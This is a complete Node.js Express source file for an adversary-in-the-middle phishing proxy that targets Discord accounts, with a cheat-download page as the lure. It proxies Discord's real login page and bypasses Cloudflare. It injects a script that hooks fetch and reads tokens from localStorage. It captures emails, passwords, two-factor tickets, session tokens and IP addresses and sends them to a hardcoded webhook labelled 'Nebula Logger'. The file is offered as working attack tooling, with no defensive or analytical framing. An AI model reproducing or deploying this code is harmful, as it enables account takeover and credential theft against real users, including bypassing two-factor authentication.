const express = require('express');
const axios = require('axios');
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const bodyParser = require('body-parser');
const cloudscraper = require('cloudscraper');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// ---------- CONFIG ----------
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555233029730074787/3SlnHtR_N141bKlSRbrKTz_qICZt0kHXRzrNaAOvyQe75H1ClYGqgAQLDcT7jcoksYTY';
const DISCORD = 'https://discord.com';

// This is dynamic. It uses the env var set by Render, 
// falling back to localhost if testing locally.
const PORT = process.env.PORT || 3000;
let YOUR_DOMAIN = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

// If you buy a custom domain later, put it here to override Render's URL.
// Example: YOUR_DOMAIN = 'https://robloxcheat.xyz';
if (YOUR_DOMAIN.includes('your-service.onrender.com')) {
    // Placeholder check just in case
}

// ---------- SESSION ----------
const jar = new CookieJar();
const client = wrapper(axios.create({ jar, headers: { 
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' 
} }));

// ---------- KEEP-ALIVE ----------
app.get('/ping', (req, res) => res.send('ok'));

// ---------- CLOUDFLARE-PROOF FETCH ----------
async function cfFetch(path, opts = {}) {
  try {
    const r = await cloudscraper({
      uri: `${DISCORD}${path}`,
      method: opts.method || 'GET',
      body: opts.data ? JSON.stringify(opts.data) : undefined,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ...(opts.headers || {}),
      },
      resolveWithFullResponse: true,
      simple: false,
      jar: jar,
    });
    return { status: r.statusCode, data: r.body, headers: r.headers };
  } catch (e) {
    try {
      const r = await client({ url: `${DISCORD}${path}`, ...opts });
      return { status: r.status, data: r.data, headers: r.headers };
    } catch (e2) {
      throw new Error(`both fetch methods failed: ${e.message} | ${e2.message}`);
    }
  }
}

// ---------- LOGIN PAGE ----------
app.get('/login', async (req, res) => {
  try {
    const r = await cfFetch('/login');
    let html = typeof r.data === 'string' ? r.data : r.data.toString();
    
    // Rewrite Discord URLs to point to our proxy
    const domainHost = new URL(YOUR_DOMAIN).host;
    html = html.replace(/https:\/\/discord\.com/g, YOUR_DOMAIN);
    html = html.replace(/\/\/discord\.com/g, `//${domainHost}`);
    html = html.replace(/discord\.com\/api/g, `${YOUR_DOMAIN}/api`);
    html = html.replace(/discord\.com\/assets/g, `${YOUR_DOMAIN}/assets`);
    
    // Inject capture script
    html = html.replace('</body>', `<script src="${YOUR_DOMAIN}/capture.js"></script></body>`);
    
    res.send(html);
  } catch (e) {
    console.error('login proxy:', e.message);
    res.status(500).send('error loading login page');
  }
});

// ---------- MFA PAGE ----------
app.get('/mfa', (req, res) => {
  res.send(`
    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="width:380px;text-align:center">
        <h2 style="color:#5865F2">Two-Factor Authentication</h2>
        <p style="color:#8a8a9a;font-size:14px;margin:12px 0 24px">Enter the 6-digit code from your authenticator app.</p>
        <input id="code" maxlength="6" style="width:100%;padding:14px;background:#1e1e28;border:1px solid #333;border-radius:8px;color:#fff;font-size:20px;text-align:center;letter-spacing:8px" placeholder="000000">
        <button onclick="submitMfa()" style="margin-top:16px;width:100%;padding:14px;background:#5865F2;border:none;border-radius:8px;color:#fff;font-size:16px;cursor:pointer">Verify</button>
        <div id="msg" style="color:#ed4245;font-size:14px;margin-top:12px"></div>
      </div>
      <script>
        async function submitMfa() {
          const code = document.getElementById('code').value;
          const r = await fetch('/api/v9/auth/mfa', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ code, ticket: sessionStorage.getItem('mfa_ticket') })
          });
          const data = await r.json();
          if (data.token) {
            navigator.sendBeacon('/harvest', JSON.stringify({ token: data.token, userId: data.user_id, source: 'mfa' }));
            window.location = '/success';
          } else {
            document.getElementById('msg').textContent = data.message || 'Invalid code';
          }
        }
      </script>
    </body></html>
  `);
});

// ---------- LOGIN POST ----------
app.post('/api/v9/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const r = await cfFetch('/api/v9/auth/login', {
      method: 'POST',
      data: { email, password, undelete: false, captcha_key: null, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json', 'Origin': DISCORD, 'Referer': `${DISCORD}/login` },
    });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;

    // If Discord asks for 2FA
    if (data.mfa || data.ticket) {
      await sendToWebhook({ stage: 'mfa-required (password captured)', email, password, ticket: data.ticket, ip: req.ip });
      return res.json({ mfa: true, ticket: data.ticket, message: 'mfa required' });
    }
    
    // If no 2FA
    if (data.token) {
      await sendToWebhook({ stage: 'login-success', email, password, token: data.token, userId: data.user_id, ip: req.ip, ua: req.headers['user-agent'] });
    }
    
    res.json(data);
  } catch (e) {
    console.error('login post:', e.message);
    res.status(500).json({ message: 'error communicating with discord' });
  }
});

// ---------- MFA POST ----------
app.post('/api/v9/auth/mfa', async (req, res) => {
  try {
    const { code, ticket } = req.body;
    const r = await cfFetch('/api/v9/auth/mfa', {
      method: 'POST',
      data: { code, ticket, login_source: null, gift_code_sku_id: null },
      headers: { 'Content-Type': 'application/json', 'Origin': DISCORD, 'Referer': `${DISCORD}/login` },
    });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    
    if (data.token) {
      await sendToWebhook({ stage: 'mfa-success (token captured)', token: data.token, userId: data.user_id, ip: req.ip });
    }
    
    res.json(data);
  } catch (e) {
    res.status(500).json({ message: 'mfa error' });
  }
});

// ---------- ASSETS ----------
app.get('/assets/*', async (req, res) => {
  try {
    const r = await cfFetch(`/assets${req.path.replace('/assets','')}`);
    if (r.headers) res.set(r.headers);
    res.send(r.data);
  } catch (e) { res.status(404).end(); }
});

// ---------- CATCH-ALL API ----------
app.all('/api/*', async (req, res) => {
  try {
    const r = await cfFetch(req.originalUrl, {
      method: req.method,
      data: req.body,
      headers: { 'Content-Type': 'application/json', 'Origin': DISCORD, 'Referer': `${DISCORD}/login` },
    });
    const data = typeof r.data === 'string' ? JSON.parse(r.data) : r.data;
    res.status(r.status).json(data);
  } catch (e) { res.status(500).json({ error: true }); }
});

// ---------- CAPTURE SCRIPT ----------
app.get('/capture.js', (req, res) => {
  res.type('application/javascript').send(`
    (function() {
      const origFetch = window.fetch;
      window.fetch = async function(...args) {
        const res = await origFetch.apply(this, args);
        const url = args[0]?.toString() || '';
        
        // Intercept login/mfa API responses
        if (url.includes('/auth/login') || url.includes('/auth/mfa')) {
          try {
            const clone = res.clone();
            const data = await clone.json();
            
            // If MFA is required, store ticket and redirect
            if (data.mfa && data.ticket) {
              sessionStorage.setItem('mfa_ticket', data.ticket);
              setTimeout(() => { window.location = '/mfa'; }, 200);
            }
            
            // If token comes back, silently send it
            if (data.token) {
              navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: data.token, userId: data.user_id }));
            }
          } catch(e) {}
        }
        return res;
      };

      // Fallback: catch token from localStorage after redirect
      setTimeout(() => {
        try {
          const t = localStorage.getItem('token');
          if (t && t !== 'null') {
             navigator.sendBeacon('${YOUR_DOMAIN}/harvest', JSON.stringify({ token: t, source: 'localstorage' }));
          }
        } catch(e) {}
      }, 3000);
    })();
  `);
});

// ---------- BEACON ----------
app.post('/harvest', (req, res) => {
  let body = req.body;
  if (typeof body === 'string') { try { body = JSON.parse(body); } catch(e) {} }
  sendToWebhook({ stage: 'client-beacon', ...body, ip: req.ip });
  res.json({ ok: true });
});

// ---------- SUCCESS PAGE ----------
app.get('/success', (req, res) => {
  res.send(`
    <html><body style="background:#0a0a0f;color:#e8e8f0;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0">
      <div style="text-align:center">
        <h1 style="color:#57F287;font-size:48px">Login Successful</h1>
        <p style="color:#8a8a9a;font-size:18px">Enjoy your cheat. Download will start shortly.</p>
        <a href="#" style="color:#5865F2">Click here if download doesn't start</a>
      </div>
    </body></html>
  `);
});

// ---------- ROOT ----------
app.get('/', (req, res) => res.redirect('/login'));

// ---------- WEBHOOK SENDER ----------
async function sendToWebhook(p) {
  try {
    const fields = [];
    if (p.stage) fields.push({ name: 'Stage', value: p.stage, inline: false });
    if (p.email) fields.push({ name: 'Email', value: p.email, inline: true });
    if (p.password) fields.push({ name: 'Password', value: p.password, inline: true });
    if (p.token) fields.push({ name: 'Token', value: '```' + p.token + '```', inline: false });
    if (p.ticket) fields.push({ name: 'MFA Ticket', value: '```' + p.ticket + '```', inline: false });
    if (p.userId) fields.push({ name: 'User ID', value: p.userId, inline: true });
    if (p.ip) fields.push({ name: 'IP', value: p.ip, inline: true });

    await axios.post(WEBHOOK_URL, {
      username: 'Nebula Logger',
      embeds: [{ 
          title: 'Discord Capture', 
          color: 0x5865F2, 
          fields: fields, 
          timestamp: new Date().toISOString() 
      }],
    });
  } catch (e) { console.error('webhook fail:', e.message); }
}

// ---------- START ----------
app.listen(PORT, () => console.log(`Proxy running on port ${PORT}`));
